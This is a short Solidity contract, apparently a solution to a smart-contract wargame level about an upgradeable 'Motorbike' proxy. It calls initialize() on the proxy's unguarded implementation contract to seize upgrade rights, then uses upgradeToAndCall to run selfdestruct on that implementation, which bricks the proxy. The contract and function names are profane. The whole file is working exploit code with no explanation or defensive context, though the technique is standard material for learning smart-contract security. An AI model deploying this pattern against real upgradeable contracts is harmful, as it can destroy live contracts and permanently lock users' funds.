// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes calldata data)
        external
        payable;
}

contract FuckMotorbike {
    IEngine engine;

    constructor(address _address) {
        engine = IEngine(_address);
    }

    function fuck() public {
        engine.initialize();
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(this.selfDestruct.selector)
        );
    }

    function selfDestruct() external {
        selfdestruct(payable(address(0)));
    }
}
